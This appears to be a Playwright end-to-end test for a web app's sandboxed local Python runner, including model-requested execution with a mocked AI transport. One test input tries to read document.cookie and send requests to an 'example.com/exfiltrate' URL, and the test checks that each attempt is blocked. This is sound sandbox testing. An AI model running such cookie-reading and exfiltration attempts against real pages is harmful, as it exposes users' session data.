import { chromium, expect } from "@playwright/test";

const browser = await chromium.launch({ headless: true, args: ["--no-sandbox"] });
try {
  const page = await browser.newPage({ viewport: { width: 390, height: 844 } });
  const errors = new Set<string>();
  page.on("pageerror", error => { if (!errors.has(error.message)) { errors.add(error.message); console.error("PAGE ERROR:", error.message); } });
  page.on("console", message => { if (message.type() === "error") console.error("BROWSER:", message.text()); });
  await page.goto("http://localhost:5173/", { waitUntil: "domcontentloaded" });
  await expect(page.getByRole("heading", { name: /Good ideas deserve/ })).toBeVisible();
  const decline = page.getByRole("button", { name: "Decline cookies", exact: true });
  if (await decline.isVisible()) await decline.click();
  await page.getByRole("button", { name: "Configure local execution" }).click();
  await expect(page.getByText("Your pocket computer")).toBeVisible();
  await expect(page.getByRole("checkbox", { name: "Allow AI local Python execution" })).not.toBeChecked();
  await page.getByRole("textbox", { name: "Local Python code" }).fill('from pathlib import Path\nimport json\nPath("notes/result.txt").parent.mkdir(exist_ok=True)\nPath("notes/result.txt").write_text("hello from Python")\nprint(Path("notes/result.txt").read_text())\nprint(sum([1, 2, 3]))');
  const started = Date.now();
  await page.getByRole("button", { name: "Run Python", exact: true }).click();
  await expect(page.getByLabel("Local Python output")).toContainText("hello from Python", { timeout: 80000 });
  console.log(`First Python run (including runtime load): ${Date.now() - started} ms`);
  await expect(page.getByLabel("Local Python output")).toContainText("6");
  await page.getByRole("button", { name: "Files", exact: true }).click();
  await page.getByRole("button", { name: "notes/result.txt", exact: true }).click();
  await expect(page.locator(".file-code")).toHaveText("hello from Python");
  await page.getByRole("button", { name: "Local", exact: true }).click();
  await page.getByRole("textbox", { name: "Local Python code" }).fill('from pathlib import Path\nprint(Path("notes/result.txt").read_text())\nimport js\ntry:\n    print(js.document.cookie)\nexcept Exception:\n    print("No document access")\ntry:\n    await js.fetch("https://example.com/exfiltrate")\nexcept Exception:\n    print("Network blocked")\ntry:\n    js.eval("(() => { const r = new XMLHttpRequest(); r.open(\'GET\', \'https://example.com/exfiltrate\', false); r.send(); })()")\nexcept Exception:\n    print("Native network blocked")');
  await page.getByRole("button", { name: "Run Python", exact: true }).click();
  await expect(page.getByLabel("Local Python output")).toContainText("No document access");
  await expect(page.getByLabel("Local Python output")).toContainText("Network blocked");
  await expect(page.getByLabel("Local Python output")).toContainText("Native network blocked");
  await expect(page.getByLabel("Local Python output")).toContainText("hello from Python");
  // The worker/frame must be released after each run instead of retaining RAM.
  await expect(page.getByTitle("Isolated local Python runtime")).toHaveCount(0);
  await page.getByRole("button", { name: "Switch to dark mode" }).click();
  await expect(page.locator("html")).toHaveClass(/dark/);
  await page.screenshot({ path: "node_modules/.local-mobile-dark-preview.png", fullPage: true });
  await page.screenshot({ path: "node_modules/.local-mobile-preview.png", fullPage: true });
  const geometry = await page.locator(".local-panel").boundingBox();
  if (!geometry || geometry.x < 0 || geometry.x + geometry.width > 391) throw new Error("Local panel exceeds mobile viewport");
  await page.getByRole("button", { name: "Open menu", exact: true }).click();
  await page.getByRole("button", { name: "New conversation", exact: false }).click();
  await page.getByRole("button", { name: "Close workspace", exact: true }).click();
  await page.getByRole("button", { name: "Configure local execution" }).click();
  await expect(page.getByRole("checkbox", { name: "Allow AI local Python execution" })).not.toBeChecked();
  await page.getByRole("textbox", { name: "Local Python code" }).fill('from pathlib import Path\nprint(Path("notes/result.txt").exists())');
  await page.getByRole("button", { name: "Run Python", exact: true }).click();
  await expect(page.getByLabel("Local Python output")).toContainText("False", { timeout: 80000 });
  await page.getByRole("textbox", { name: "Local Python code" }).fill("while True:\n    pass");
  await page.getByRole("button", { name: "Run Python", exact: true }).click();
  await expect(page.locator(".local-output [role='alert']")).toContainText("15-second limit", { timeout: 20000 });
  await page.getByRole("textbox", { name: "Local Python code" }).fill("print('Recovered')");
  await page.getByRole("button", { name: "Run Python", exact: true }).click();
  await expect(page.getByLabel("Local Python output")).toContainText("Recovered", { timeout: 80000 });
  await page.setViewportSize({ width: 1440, height: 1000 });
  await expect(page.getByText("Your pocket computer")).toBeVisible();
  await page.screenshot({ path: "node_modules/.local-desktop-preview.png", fullPage: true });
  console.log("PASS: real Python execution, file creation/read/save, blocked native network, mobile geometry, light/dark theme, chat separation, timeout, recovery and runtime disposal.");

  // Mock only the model/account transport; execute its requested Python for real.
  const aiPage = await browser.newPage({ viewport: { width: 1440, height: 1000 } });
  await aiPage.addInitScript(() => {
    let calls = 0;
    const sdk = {
      auth: { isSignedIn: () => true, getUser: async () => ({ username: "local-e2e" }), signIn: async () => {}, signOut: () => {} },
      ai: {
        listModels: async () => [{ id: "gpt-5-nano", name: "Test model", provider: "Test" }],
        chat: async (messages: { content: string }[]) => {
          calls++;
          if (calls === 2 && !messages[messages.length - 1].content.includes("updated by real Python")) throw new Error("Actual file results did not reach the model");
          return (async function* () {
            yield { type: "text", text: calls === 1 ? '```json\n{"files":[{"name":"input.txt","content":"original input"}]}\n```\n```orbit-python\nfrom pathlib import Path\nprint(Path("input.txt").read_text())\nPath("input.txt").write_text("updated by real Python")\nPath("ai-result.txt").write_text("model requested this file")\n```' : "Verified the execution output and created your file." };
          })();
        },
      },
    };
    (window as unknown as Record<string, unknown>).__ORBIT_TEST_SDK = sdk;
  });
  await aiPage.route("**/src/lib/puter.ts*", async route => {
    const response = await route.fetch();
    const body = (await response.text()).replace(/export function loadPuter\(\)[\s\S]*?(?=export async function discoverModels)/, "export function loadPuter() { return Promise.resolve(window.__ORBIT_TEST_SDK); }\n");
    await route.fulfill({ response, body });
  });
  await aiPage.goto("http://localhost:5173/", { waitUntil: "domcontentloaded" });
  await expect(aiPage.locator(".header-connect")).toHaveText("local-e2e");
  if (await aiPage.getByRole("button", { name: "Decline cookies", exact: true }).isVisible()) await aiPage.getByRole("button", { name: "Decline cookies", exact: true }).click();
  await aiPage.getByRole("button", { name: "Local execution", exact: true }).click();
  await aiPage.getByRole("checkbox", { name: "Allow AI local Python execution" }).check();
  await aiPage.getByRole("textbox", { name: "Message", exact: true }).fill("Read a file and create a new one using Python");
  await aiPage.getByRole("button", { name: "Send message", exact: true }).click();
  await expect(aiPage.locator(".message-content").last()).toContainText("Verified the execution output", { timeout: 80000 });
  await expect(aiPage.getByLabel("Local Python output")).toContainText("original input");
  await aiPage.getByRole("button", { name: "Files", exact: true }).click();
  await aiPage.getByRole("button", { name: "input.txt", exact: true }).click();
  await expect(aiPage.locator(".file-code")).toHaveText("updated by real Python");
  await aiPage.getByRole("button", { name: "ai-result.txt", exact: true }).click();
  await expect(aiPage.locator(".file-code")).toHaveText("model requested this file");
  await aiPage.reload({ waitUntil: "domcontentloaded" });
  await aiPage.getByRole("button", { name: "Files", exact: true }).click();
  await aiPage.getByRole("button", { name: "ai-result.txt", exact: true }).click();
  await expect(aiPage.locator(".file-code")).toHaveText("model requested this file");
  console.log("PASS: model-requested real Python, result follow-up, new files, no stale artifact overwrite, and persistence after reload (mocked model transport).");
} finally { await browser.close(); }
